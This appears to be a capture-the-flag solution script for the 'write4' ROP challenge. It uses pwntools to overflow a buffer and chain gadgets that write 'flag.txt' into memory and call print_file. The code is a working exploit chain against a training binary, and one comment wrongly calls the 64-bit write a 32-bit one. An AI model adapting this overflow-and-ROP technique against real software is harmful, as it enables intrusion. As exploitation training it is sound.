# If we run 'ROPgadget write4', we will see a 'mov' command at address 0x400628.
# the 'mov' assigns a 32 bit location at r14 to whatever is in r15. to sum up: r14 is the location, r15 is what to write.
# with that, we control r14 and r15, with the pop instruction at address 0x400690.
# so, we need to craft a payload, that looks like this:

from pwn import *

context.binary = './write4'
context.log_level = 'debug'

write_to = p64(0x400628)  # mov qword ptr [r14], r15; ret
pop_r14_r15 = p64(0x400690)  # pop r14; pop r15; ret
pop_rdi = p64(0x400693)  # pop rdi; ret
loc_to_write = p64(0x0000000000601038) # bss
print_file = p64(0x400510) # print_file@plt

offset = b'A'*40

payload = [
 offset,
 pop_r14_r15,
 loc_to_write,   # this will be r14 (the location to write to),
 b'flag.txt',
 write_to,
 pop_rdi,
 loc_to_write,
 print_file
]

payload = b"".join(payload)

target = process(['./write4'])

target.sendline(payload)
#open('payload', 'w').write(payload)
print(target.recvall().decode('utf-8'))

